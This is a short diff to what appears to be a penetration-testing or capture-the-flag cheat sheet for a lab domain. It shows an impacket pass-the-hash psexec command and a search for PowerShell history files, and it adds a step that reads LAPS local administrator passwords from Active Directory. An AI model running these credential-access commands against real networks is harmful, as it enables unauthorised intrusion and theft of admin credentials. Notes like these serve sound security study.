@@ -30,3 +30,8 @@ impacket-psexec egotistical-bank.local/administrator@10.10.10.175 -hashes aad3b4
 ```
 Get-ChildItem -Path C:\ -Include ConsoleHost_history.txt -File -Recurse -ErrorAction SilentlyContinue
 ```
+
+#### If in the LAPS reader group : 
+```
+Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd
+```
